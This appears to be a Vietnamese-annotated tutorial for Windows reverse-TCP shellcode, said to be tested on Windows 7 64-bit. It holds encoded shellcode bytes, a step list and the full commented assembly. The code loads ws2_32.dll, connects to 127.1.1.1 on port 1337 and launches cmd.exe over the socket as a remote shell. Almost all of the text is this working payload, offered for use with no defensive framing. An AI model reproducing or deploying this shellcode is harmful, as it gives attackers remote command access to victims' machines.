Shell reverse TCP 127.1.1.1 1337
Đã test trên win7-64

------------------------------------------------------
Các bước làm:
------------------------------------------------------
"\x66\x31\xc0\xb8\x33\x32\x66\x50\x66\x68\x77\x73\x32\x5f\x66"
"\x54\x66\xbb\xd7\x49\x3b\x77\x66\xff\xd3\x66\x89\xc5\x66\x31"
"\xc0\xb8\x75\x70\x66\x50\x68\x74\x61\x68\x57\x53\x66\x54\x66"
"\x55\x66\xbb\x22\x12\x3b\x77\x66\xff\xd3\x66\x31\xdb\xbb\x90"
"\x01\x66\x29\xdc\x66\x54\x66\x53\x66\xff\xd0\x66\x31\xc0\xb8"
"\x74\x41\x66\x50\x68\x6f\x63\x68\x57\x53\x66\x54\x66\x55\x66"
"\xbb\x22\x12\x3b\x77\x66\xff\xd3\x66\x31\xdb\x66\x53\x66\x53"
"\x66\x53\x66\x31\xc9\xb1\x06\x66\x51\x66\x43\x66\x53\x66\x43"
"\x66\x53\x66\xff\xd0\x66\x97\x66\xbb\x65\x65\x63\x74\x66\xc1"
"\xeb\x08\x66\x53\x68\x63\x6f\x66\x54\x66\x55\x66\xbb\x22\x12"
"\x3b\x77\x66\xff\xd3\x68\x7f\x01\x68\x05\x39\x66\x31\xdb\x80"
"\xc3\x02\x53\x66\x89\xe2\x6a\x10\x66\x52\x66\x57\x66\xff\xd0"
"\x66\xba\x63\x63\x6d\x64\x66\xc1\xea\x08\x66\x52\x66\x89\xe1"
"\x66\x31\xd2\x66\x83\xec\x10\x66\x89\xe3\x66\x57\x66\x57\x66"
"\x57\x66\x52\x66\x52\x66\x31\xc0\x66\x40\x66\xc1\xc0\x08\x66"
"\x40\x66\x50\x66\x52\x66\x52\x66\x52\x66\x52\x66\x52\x66\x52"
"\x66\x52\x66\x52\x66\x52\x66\x52\x66\x31\xc0\x04\x2c\x66\x50"
"\x66\x89\xe0\x66\x53\x66\x50\x66\x52\x66\x52\x66\x52\x66\x31"
"\xc0\x66\x40\x66\x50\x66\x52\x66\x52\x66\x51\x66\x52\x66\xbb"
"\x72\x10\x3b\x77\x66\xff\xd3\x66\x31\xd2\x66\x50\x66\xb8\x10"
"\x7a\x3b\x77\x66\xff\xd0"

------------------------------------------------------
Các bước làm:
------------------------------------------------------
	Load ws2_32.dll với LoadLibrary
	Tìm WSAStartUp với hàm GetProcAddress
	Call WSAStartUp
	Tìm WSASocketA với hàm GetProcAddress
	Call WSASocketA
	Tìm connect với hàm GetProcAddress
	Call connect
	Call CreateProcessA cmd.exe
	Call ExitProcess (optional)



------------------------------------------------------
shellcode
------------------------------------------------------

	xor eax, eax
	mov ax, 0x3233         ; '\0\023' 
	push eax
	push dword 0x5f327377  ; '_2sw'
	push esp

	mov ebx, 0x773b49d7			; LoadLibraryA(libraryname)
	call ebx
	mov ebp, eax	

	xor eax, eax
	mov ax, 0x7075      ; '\0\0up'
    push eax
    push 0x74726174     ; 'trat'
    push 0x53415357     ; 'SASW'
    push esp

	push ebp

	mov ebx, 0x773b1222			; GetProcAddress(hmodule, WSAStartUp)
	call ebx

	xor ebx, ebx
	mov bx, 0x0190
	sub esp, ebx
	push esp
	push ebx

	call eax					; WSAStartUp(MAKEWORD(2, 2), wsadata_pointer)

	xor eax, eax
	mov ax, 0x4174      ; '\0\0At'
	push eax
	push 0x656b636f     ; 'ekco'
	push 0x53415357     ; 'SASW'
	push esp

    push ebp

    mov ebx, 0x773b1222    ; GetProcAddress(hmodule, WSASocketA)
    call ebx

	xor ebx, ebx
	push ebx
	push ebx
	push ebx
	xor ecx, ecx
	mov cl, 6
	push ecx
	inc ebx
	push ebx
	inc ebx
	push ebx

	call eax    ; WSASocket(AF_INET = 2, SOCK_STREAM = 1,
				;   IPPROTO_TCP = 6, NULL,
				;   (unsigned int)NULL, (unsigned int)NULL);


	xchg eax, edi

	mov ebx, 0x74636565 ; '\0tce'
	shr ebx, 8
	push ebx
	push 0x6e6e6f63     ; 'nnoc'
	push esp

    push ebp

    mov ebx,  0x773b1222 			; GetProcAddress(hmodule, connect)
    call ebx

	push 0x0101017f	
	push word 0x3905
	xor ebx, ebx
	add bl, 2
	push word bx
	mov edx, esp

	push byte 16
	push edx
	push edi

	call eax            ; connect(s1, (SOCKADDR*) &hax, sizeof(hax) = 16);

	mov edx, 0x646d6363
	shr edx, 8
	push edx
	mov ecx, esp

	xor edx, edx

	sub esp, 16
	mov ebx, esp		; PROCESS_INFORMATION

	push edi
	push edi
	push edi
	push edx
	push edx
	xor eax, eax
	inc eax
	rol eax, 8
	inc eax
	push eax
	push edx
	push edx
	push edx
	push edx
	push edx
	push edx
	push edx
	push edx
	push edx
	push edx
	xor eax, eax
	add al, 44
	push eax
	mov eax, esp		; STARTUP_INFO

	push ebx		    ; PROCESS_INFORMATION
	push eax		    ; STARTUP_INFO
	push edx
	push edx
	push edx
	xor eax, eax
	inc eax
	push eax
	push edx
	push edx
	push ecx
	push edx

	mov ebx, 0x773b1072	; CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	call ebx


end:
	xor edx, edx
	push eax
	mov eax, 0x773b7a10	; ExitProcess(exitcode)
	call eax